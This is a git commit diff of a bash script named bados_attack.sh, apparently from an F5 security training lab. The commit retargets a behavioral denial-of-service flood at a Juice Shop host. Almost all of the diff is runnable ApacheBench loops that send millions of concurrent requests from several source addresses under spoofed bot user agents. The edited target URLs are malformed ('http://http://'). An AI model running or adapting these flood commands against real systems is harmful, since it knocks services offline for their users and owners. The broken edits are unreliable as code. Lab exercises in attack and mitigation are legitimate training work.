5177f3ed1bec9bd8201febe9d88393e414824790
eriknovak <erik_novak@yahoo.com>
2023-08-01 12:25:34 -0700

    Update bados_attack.sh

--- attacks/bados_attack.sh
+++ attacks/bados_attack.sh
@@ -12,13 +12,13 @@
 # to get the student_id number from SSH_CLIENT env variable
 # if SSH_CLIENT is not set, the script will exit
 #
-if [ -n "$SSH_CLIENT" ]; then
-   student_id=$(echo $SSH_CLIENT | cut -f3 -d.)
-else
-   echo "SSH_CLIENT variable is not set, cannot continue, exiting"
-   exit 1
-fi
-trap ctrl_c INT
+#if [ -n "$SSH_CLIENT" ]; then
+ #  student_id=$(echo $SSH_CLIENT | cut -f3 -d.)
+# else
+  # echo "SSH_CLIENT variable is not set, cannot continue, exiting"
+   # exit 1
+# fi
+# trap ctrl_c INT
 
 function ctrl_c() {
    echo "** Trapped CTRL-C"
@@ -26,12 +26,13 @@ function ctrl_c() {
    exit 1
 }
 clear
-echo "Traffic Baselining"
+echo "Attacking Juice Shop"
 echo
 ###########################################
 # $1    IP address (BIG-IP VS address)
-VS_ADDR=${1:-10.10.${student_id}.101}
-#
+IP=$1
+# VS_ADDR=${1:-10.10.${student_id}.101}
+
 # $2 Source Address 1 (Kali box interface)
 # $3 Source Address 2 (Kali box interface)
 # $4 Source Address 3 (Kali box interface)
@@ -63,10 +64,10 @@ do
             while [ "$stop_flag" -eq 0 ]
             do
 
-                    ab -B ${SRC_ADDR1} -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: eVil-sVen" -H "x-requested-with:" -H "Referer: http://10.10.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://${VS_ADDR}/ &
-                    ab -B ${SRC_ADDR2} -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)" -H "x-requested-with:" -H "Referer: http://10.10.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://${VS_ADDR}/ &
-                    ab -B ${SRC_ADDR3} -l -r -n 1000000 -c 500 -d -s 10 -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: WireXBot" -H "x-requested-with:" -H "Referer: http://10.10.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://${VS_ADDR}/ &
-                    ab -B ${SRC_ADDR4} -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Darth-Vader" -H "x-requested-with:" -H "Referer: http://10.10.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://${VS_ADDR}/
+                    ab -B ${SRC_ADDR1} -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: eVil-sVen" -H "x-requested-with:" -H "Referer: http://10.10.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://http://juice.f5trn.com/ &
+                    ab -B ${SRC_ADDR2} -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)" -H "x-requested-with:" -H "Referer: http://10.10.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://http://juice.f5trn.com/ &
+                    ab -B ${SRC_ADDR3} -l -r -n 1000000 -c 500 -d -s 10 -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: WireXBot" -H "x-requested-with:" -H "Referer: http://10.10.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://http://juice.f5trn.com/ &
+                    ab -B ${SRC_ADDR4} -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Darth-Vader" -H "x-requested-with:" -H "Referer: http://10.10.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://http://juice.f5trn.com/
 
                     killall ab
             done
@@ -76,10 +77,10 @@ do
             stop_flag=0
             while [ "$stop_flag" -eq 0 ]
             do
-                    ab -B ${SRC_ADDR1} -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: WireXBot" -H "x-requested-with:" -H "Referer: http://10.10.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://${VS_ADDR}/ &
-                    ab -B ${SRC_ADDR2} -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: WireXBot" -H "x-requested-with:" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://${VS_ADDR}/second.jpg &
-                    ab -B ${SRC_ADDR3} -l -r -n 1000000 -c 500 -d -s 10 -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: WireXBot" -H "x-requested-with:" -H "Referer: http://10.10.2.2/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://${VS_ADDR}/ &
-                    ab -B ${SRC_ADDR4} -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Darth-Vader" -H "x-requested-with:" -H "Referer: http://10.10.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://${VS_ADDR}/
+                    ab -B ${SRC_ADDR1} -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: WireXBot" -H "x-requested-with:" -H "Referer: http://10.10.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US" http://http://juice.f5trn.com/ &
+                    ab -B ${SRC_ADDR2} -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: WireXBot" -H "x-requested-with:" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://http://juice.f5trn.com/second.jpg &
+                    ab -B ${SRC_ADDR3} -l -r -n 1000000 -c 500 -d -s 10 -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: WireXBot" -H "x-requested-with:" -H "Referer: http://10.10.2.2/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://http://juice.f5trn.com/ &
+                    ab -B ${SRC_ADDR4} -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Darth-Vader" -H "x-requested-with:" -H "Referer: http://10.10.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://http://juice.f5trn.com/
 
                     killall ab
             done
